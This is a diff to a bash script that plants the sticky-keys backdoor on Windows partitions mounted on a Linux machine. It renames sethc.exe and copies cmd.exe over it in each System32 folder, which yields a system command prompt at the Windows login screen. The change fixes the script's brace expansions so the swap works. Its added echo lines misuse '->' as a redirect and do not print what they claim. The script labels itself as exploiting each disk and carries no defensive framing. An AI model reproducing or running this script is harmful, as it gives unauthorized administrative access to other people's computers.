@@ -1,5 +1,4 @@
 #!/usr/bin/env bash
-# windirs=()
 for dir in /media/$USER/*; do
   lwindir="$dir/Windows/System32"
   if [ -d "$lwindir" ]; then
@@ -7,8 +6,10 @@ for dir in /media/$USER/*; do
     echo "exploiting: $dir"
     (
       cd "$lwindir" || exit
-      mv "$lwindir/sethc.{exe,exe.old}"
-      cp "$lwindir/{cmd,sethc}.exe"
+      echo sethc.exe -> sethc.exe.old
+      mv sethc.{exe,exe.old}
+      echo cp cmd.exe -> sethc.exe
+      cp {cmd,sethc}.exe
     )
   fi
 done
